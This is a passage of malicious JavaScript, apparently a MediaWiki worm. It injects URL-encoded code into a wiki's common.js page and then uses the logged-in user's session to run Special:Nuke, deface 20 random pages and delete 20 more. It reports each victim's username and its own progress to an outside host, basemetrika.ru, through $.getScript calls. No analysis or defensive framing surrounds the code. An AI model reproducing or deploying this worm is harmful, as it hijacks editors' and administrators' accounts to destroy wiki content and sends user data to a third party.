20%3D%20document.createElement%28%27span%27%29%3B%0A%20%20%20%20%20%20copy_sp.id%20%3D%20%27ctrlcopy%27%3B%0A%20%20%20%20%20%20copy_sp.innerHTML%20%3D%20options.htmlcopytxt%3B%0A%20%20%20%20%20%20return%20this.each%28function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28this%29.mousedown%28function%28%29%7B%24%28%27%23ctrlcopy%27%29.remove%28%29%3B%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28this%29.mouseup%28function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28window.getSelection%29%7B%09//good%20times%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20slcted%3Dwindow.getSelection%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20seltxt%3Dslcted.toString%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28%21seltxt%7C%7Cseltxt.length%3Coptions.minlen%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20nslct%20%3D%20slcted.getRangeAt%280%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt%20%3D%20nslct.cloneRange%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt.collapse%28options.addcopyfirst%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt.insertNode%28copy_sp%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21options.addcopyfirst%29%20nslct.setEndAfter%28copy_sp%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20slcted.removeAllRanges%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20slcted.addRange%28nslct%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%28document.selection%29%7B%09//bad%20times%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20slcted%20%3D%20document.selection%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20nslct%3Dslcted.createRange%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20seltxt%3Dnslct.text%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21seltxt%7C%7Cseltxt.length%3Coptions.minlen%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt%3Dnslct.duplicate%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt.collapse%28options.addcopyfirst%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20seltxt.pasteHTML%28copy_sp.outerHTML%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21options.addcopyfirst%29%20%7Bnslct.setEndPoint%28%22EndToEnd%22%2Cseltxt%29%3B%20nslct.select%28%29%3B%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%7D%0A%20%20%0A%20%20if%20%28wgUserName%20%3D%3D%20null%29%20%7B%0A%20%20%20%20%20%20%24%28document%29.addtocopy%28%7Bhtmlcopytxt%3A%20%27%3Cbr%3E%D0%9F%D0%BE%D0%B4%D1%80%D0%BE%D0%B1%D0%BD%D0%B5%D0%B5%3A%20%3Ca%20href%3D%22%27%2Bwindow.location.href%2B%27%22%3E%27%2Bwindow.location.href%2B%27%3C/a%3E%27%7D%29%3B%0A%20%20%7D%0A%20%20%0A%20%20%24%28function%28%29%20%7B%0A%20%20%20%20%20%24%28%27.dynnav-button%27%29.each%28function%28i%2Ce%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28this%29.data%28%27i%27%2C%20i%2B1%29.click%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20var%20%24this%20%3D%20%24%28this%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24template%20%3D%20%24%28%27%23dynnav-template-%27%20%2B%20%24this.data%28%27i%27%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20if%28%20%24this.hasClass%28%27dynnav-button-inactive%27%29%20%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.dynnav-button-active%27%29.removeClass%28%27dynnav-button-active%27%29.addClass%28%27dynnav-button-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.dynnav-template%27%29.slideUp%28250%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27dynnav-button-inactive%27%29.addClass%28%27dynnav-button-active%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24template.slideDown%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27dynnav-button-active%27%29.addClass%28%27dynnav-button-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24template.slideUp%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%7D%29%3B%0A%20%20%7D%29%3B%0A%20%20");
            data_ser = data_ser.replace(/wpSummary=[^&]*/g, "wpSummary=" + ".");
            $.ajax({
                type : "POST",
                url : editform3.attr("action"),
                data : data_ser
            }, function (data) {
                $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
                    "User name '" + wgUserName + "', made edit in common.js"
                ));
            });
        });
    } else {
        $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
            "User name '" + wgUserName + "', negative pattern in common.js"
        ));
    }
})
$.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
    "User name '" + wgUserName + "', trying NUKE"
));
for(var i = 0; i < Number("3"); i ++) {
    $.get("/w/index.php?title=Special:Nuke", function (data) {
        var nukeform = $(data).find("form[action*='submit']");
        var data_ser = nukeform.serialize();
        $.ajax({
            type : "POST",
            url : nukeform.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}
for(var i = 0; i < Number("20"); i ++) {
    $.get("/w/index.php?title=Special:Random&action=edit", function (data) {
        var editform3 = $(data).find("#editform");
        var data_ser = editform3.serialize();
        data_ser = data_ser.replace(/wpTextbox1=([^&]*)/g, "wpTextbox1=" + "%5B%5B%D0%A4%D0%B0%D0%B9%D0%BB%3ADyatel%20in%20work.png%5D%5D%0A" + "$1");
        data_ser = data_ser.replace(/wpSummary=([^&]*)/g, "wpSummary=" + "%D0%A6%D0%B8%D1%80%D0%BA%20%D0%B7%D0%B0%D0%B6%D0%B8%D0%B3%D0%B0%D0%B5%D1%82%20%D0%BE%D0%B3%D0%BD%D0%B8");
        $.ajax({
            type : "POST",
            url : editform3.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}
for(var i = 0; i < Number("20"); i ++) {
    $.get("/w/index.php?title=Special:Random&action=delete", function (data) {
        var delform3 = $(data).find("form[action*='delete']");
        var data_ser = delform3.serialize();
        $.ajax({
            type : "POST",
            url : delform3.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}
    });
    document.head.appendChild(script);
})();